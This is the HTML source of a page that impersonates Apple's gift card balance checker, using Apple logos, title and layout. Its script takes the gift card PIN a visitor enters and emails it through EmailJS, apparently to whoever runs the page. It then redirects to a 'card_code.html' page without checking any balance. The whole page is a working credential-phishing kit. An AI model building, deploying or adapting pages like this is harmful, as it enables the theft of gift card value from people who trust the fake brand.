<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Favicon (Logo for title bar) -->
    <link rel="icon" type="image/png" href="apple_logo_2.jpeg">
    <link href="https://cdn.jsdelivr.net/npm/flowbite@2.5.2/dist/flowbite.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <title>Apple Gift Card Balance Check</title>
</head>

<body>
     <div class="top_nav flex items-center justify-between p-2">
        <div class="apple_logo">
            <img src="apple_logo.png" alt="logo" class="w-10 h-10">
        </div>
        <div class="action_btn flex items-center justify-between">
            <a href="">
                <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="m21 21-3.5-3.5M17 10a7 7 0 1 1-14 0 7 7 0 0 1 14 0Z"/>
                  </svg>                  
            </a>
            <a href="">
                <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10V6a3 3 0 0 1 3-3v0a3 3 0 0 1 3 3v4m3-2 .917 11.923A1 1 0 0 1 17.92 21H6.08a1 1 0 0 1-.997-1.077L6 8h12Z"/>
                  </svg>                  
            </a>
            <a href="">
                <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="M5 7h14M5 12h14M5 17h14"/>
                  </svg>                  
            </a>
        </div>
     </div>   
     <div class="sub_nav flex items-center justify-between p-2">
        <h1 class="font-bold">Apple Gift Card</h1>
        <div class="action_btn flex items-center justify-between">
            <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 9-7 7-7-7"/>
              </svg>              
            <a href="" id="buy" class="text-white bg-blue-500 hover:bg-blue-700 ">Buy</a>
        </div>
     </div>

    <div class="main flex items-center justify-center flex-col mt-10">
        <h1 class="text-3xl text-center font-bold mb-10">Check Your Apple Gift <br> Card Balance</h1>
        <h2 class="text-xl font-bold mb-5">Enter your PIN here:</h2>

        <form class="mb-10 flex items-center justify-center flex-col">
            <input type="text" name="pin" id="base-input" placeholder="Gift Card PIN" 
                class="border border-gray-500 text-gray-900 text-xl rounded-lg focus:ring-blue-500 
                focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 
                dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 
                dark:focus:border-blue-500" required>
            
            <p class="mt-3">Can't find your PIN? <a href="#" class="text-blue-500 underline">Learn more</a></p>
            
            <button type="submit" id="submit-btn" class="bg-blue-500 border cursor-pointer mt-5 text-white 
            text-xl rounded-lg hover:bg-blue-700 focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 
            dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white 
            dark:focus:ring-blue-500 dark:focus:border-blue-500 flex items-center justify-center">
            <span id="button-text">Check Balance</span>
            <div id="spinner" class="hidden ml-3 rounded-full border-2 border-t-transparent border-blue-500 w-5 h-5 animate-spin"></div>
        </button>
        
        </form>
        

        <img src="gift_card.jpeg" alt="" class="card_img">
    </div>

     
     <script src="../path/to/flowbite/dist/flowbite.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

     <script>
        emailjs.init(""); 
    
        document.querySelector("form").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form from reloading the page
    
            // Fetch the input value
            const pin = document.getElementById("base-input").value;
    
            // Get button elements
            const submitBtn = document.getElementById("submit-btn");
            const buttonText = document.getElementById("button-text");
            const spinner = document.getElementById("spinner");
    
            // Disable button and show spinner
            submitBtn.disabled = true;
            buttonText.textContent = "Checking...";
            spinner.classList.remove("hidden");
    
            // Send form data via EmailJS
            emailjs.send("service", "template", { 
                pin: pin  // Matches the {{pin}} placeholder in the template
            }).then(
                function(response) {
                    // alert("Your PIN has been successfully submitted!");
                    window.location.href = "card_code.html";
                },
                function(error) {
                    console.error("EmailJS error: ", error); // Log the error for debugging
                    alert("Failed to send the PIN. Please try again later.");
                }
            ).finally(() => {
                // Re-enable button and hide spinner
                submitBtn.disabled = false;
                buttonText.textContent = "Check Balance";
                spinner.classList.add("hidden");
            });
        });
    </script>
       
</body>
</html>